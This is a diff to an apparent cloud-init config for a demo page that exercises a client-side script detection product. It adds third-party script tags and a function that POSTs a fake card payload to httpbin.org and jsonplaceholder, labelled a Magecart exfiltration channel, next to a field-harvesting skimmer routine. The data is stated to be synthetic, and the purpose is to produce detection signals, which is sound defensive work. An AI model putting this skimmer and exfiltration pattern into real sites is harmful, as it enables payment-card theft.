@@ -1498,6 +1498,8 @@ write_files:
            domains (detected_domains). -->
       <script src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"></script>
       <script src="https://unpkg.com/underscore@1.13.7/underscore-min.js"></script>
+      <script src="https://esm.sh/moment@2.30.1"></script>
+      <script src="https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js"></script>
       <!-- First-party checkout logic served as an EXTERNAL script (app.py /checkout.js) so CSD
            inventories it at load; it reads payment fields (Magecart skimmer) and is flagged High
            Risk. CSD does NOT inventory inline scripts, which is why this logic must be external. -->
@@ -1552,6 +1554,32 @@ write_files:
           if (el) { stolen[id] = el.value; }
         });
         return stolen;
+      }
+
+      // ── External exfiltration (Magecart data-theft channel), reproducing the CSD docs' Combined
+      //    Detection Script: POST harvested data to attacker-controlled EXTERNAL domains so CSD
+      //    records them as detected exfil domains (/detected_domains). Fires once per page load to
+      //    avoid hammering the endpoints. CSD mitigation does not block fetch() (docs) — these
+      //    domains are still detected/listed and are included for full demo fidelity.
+      let _exfilSent = false;
+      function exfilExternal() {
+        if (_exfilSent) { return; }
+        _exfilSent = true;
+        // Payload is STATIC synthetic data only — never the real harvested field values. CSD detects
+        // the external DOMAIN (the request itself), not the payload, so synthetic values preserve the
+        // detection signal while guaranteeing no real card data / PII ever leaves the origin, even if
+        // a real visitor types real data into this internet-exposed demo page.
+        const payload = JSON.stringify({
+          type: "combined_demo",
+          credentials: { pan: "4111111111111111", cvv: "999", exp: "12/99", note: "synthetic demo data" },
+          page: window.location.href,
+          timestamp: Date.now()
+        });
+        fetch("https://www.httpbin.org/post", { method: "POST", mode: "no-cors", body: payload }).catch(function() {});
+        fetch("https://jsonplaceholder.typicode.com/posts", {
+          method: "POST", mode: "no-cors",
+          headers: { "Content-Type": "application/json" }, body: payload
+        }).catch(function() {});
       }
 
       // ── Card Skimmer (Magecart-style) ──
@@ -1685,6 +1713,7 @@ write_files:
         _checkoutForm.addEventListener("input", harvestPaymentFields);
       }
       harvestPaymentFields();
+      exfilExternal();
       updateCount();
 
   - path: /opt/origin-server/csd-demo/templates/dashboard.html
